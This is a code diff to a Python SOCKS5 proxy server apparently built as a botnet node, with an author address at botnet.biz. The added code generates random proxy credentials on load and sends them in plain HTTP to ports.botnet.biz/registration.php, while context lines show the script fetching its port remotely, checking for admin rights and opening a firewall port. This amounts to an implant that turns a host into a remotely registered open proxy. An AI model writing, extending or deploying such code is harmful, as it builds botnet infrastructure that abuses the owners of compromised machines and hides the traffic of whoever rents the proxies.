@@ -7,6 +7,8 @@ import time
 import logging
 import select
 import struct
+import string
+import random
 import urllib.request
 from IPy import IP
 from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler
@@ -14,16 +16,25 @@ from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler
 __author__ = "Tomas Keske <admin@botnet.biz>"
 __website__ = "https://github.com/tkeske/"
 
+def id_generator(size=9, chars=string.ascii_uppercase + string.digits):
+       return ''.join(random.choice(chars) for _ in range(size))
+
+def registerCredentials(username, password):
+        p = urllib.request.urlopen("http://ports.botnet.biz/registration.php?usr="+username+"&pwd="+password).read()
+        print(p)
+
 logging.basicConfig(level=logging.DEBUG)
 SOCKS_VERSION = 5
+username = id_generator()
+password = id_generator()
+
+registerCredentials(username, password)
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
         pass
 
-class SocksProxy(StreamRequestHandler):
-    username = 'username'
-    password = 'password'
+class SocksProxy(StreamRequestHandler):    
 
     def handle(self):
         logging.info('Accepting connection from %s:%s' % self.client_address)
@@ -44,6 +55,7 @@ class SocksProxy(StreamRequestHandler):
 
         # send welcome message
         self.connection.sendall(struct.pack("!BB", SOCKS_VERSION, 2))
+
 
         if not self.verify_credentials():
             return
@@ -97,12 +109,12 @@ class SocksProxy(StreamRequestHandler):
         assert version == 1
 
         username_len = ord(self.connection.recv(1))
-        username = self.connection.recv(username_len).decode('utf-8')
+        usernamelocal = self.connection.recv(username_len).decode('utf-8')
 
         password_len = ord(self.connection.recv(1))
-        password = self.connection.recv(password_len).decode('utf-8')
+        passwordlocal = self.connection.recv(password_len).decode('utf-8')
 
-        if username == self.username and password == self.password:
+        if usernamelocal == username and passwordlocal == password:
             # success, status = 0
             response = struct.pack("!BB", version, 0)
             self.connection.sendall(response)
@@ -157,9 +169,10 @@ def getPort():
 if is_admin():
 
         #get port from database
-        port = int(getPort()[0])
+        port = int(getPort()[1])
 
         print(port)
+
         #add firewall exception
         openFirewallPort()
 
